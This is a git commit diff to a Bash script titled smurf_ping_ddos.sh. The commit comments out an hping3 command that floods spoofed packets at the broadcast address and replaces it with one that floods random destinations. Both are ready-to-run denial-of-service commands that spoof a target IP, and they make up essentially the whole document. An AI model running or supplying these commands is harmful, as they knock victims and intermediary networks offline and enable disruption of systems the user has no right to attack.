e351e9e6c47ad324d25e6538b9c73deb6ee48025
Corvo <rodrigo-f-p@hotmail.com>
2023-04-29 16:04:05 -0300

    Update smurf_ping_ddos.sh

--- Code/Bash/smurf_ping_ddos.sh
+++ Code/Bash/smurf_ping_ddos.sh
@@ -4,4 +4,5 @@
 route -n
 
 # Ping:
-sudo hping3 --flood --spoof <target ip> --data 65535 255.255.255.255
+#sudo hping3 --flood --spoof <target ip> --data 65535 255.255.255.255
+sudo hping3 --flood --spoof <target ip> --data 65535 --rand-dest
